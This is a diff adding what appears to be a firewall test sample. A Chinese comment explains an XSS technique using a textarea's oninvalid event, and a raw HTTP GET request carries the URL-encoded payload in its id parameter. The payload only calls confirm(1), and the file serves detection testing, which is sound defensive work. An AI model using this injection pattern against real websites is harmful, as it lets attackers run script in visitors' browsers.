@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_textarea标签_oninvalid事件-06506522
+# 该xss语句利用 oninvalid 属性：当用户在输入框中输入无效内容时，oninvalid 属性指定的 JavaScript 代码会被执行。攻击者利用这一点，在输入框中注入恶意脚本，使其在用户输入无效内容时执行。使用 required 属性：required 属性表示该输入框是必填的，这使得攻击者可以更容易地诱导用户在攻击者构造的恶意输入框中输入内容，从而触发 XSS 攻击。使用文本域（textarea）：与普通的输入框相比，文本域可以容纳更多的文本。攻击者利用这一点，在文本域中注入更多的恶意脚本，增加攻击的复杂度和隐蔽性。
+GET /?id=%3Cform%3E%3Ctextarea%20oninvalid=confirm%281%29%20required%3E%3Cinput%20type=submit%3E&bid=hd_tag_m8mv26cp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26cp
+RM-PRO-Token: a76ec43d2731f83c89c56bbd29e9fe8f
+RM-PRO-Time: 1742808581964
+User-Agent: curl/7.83.1
+
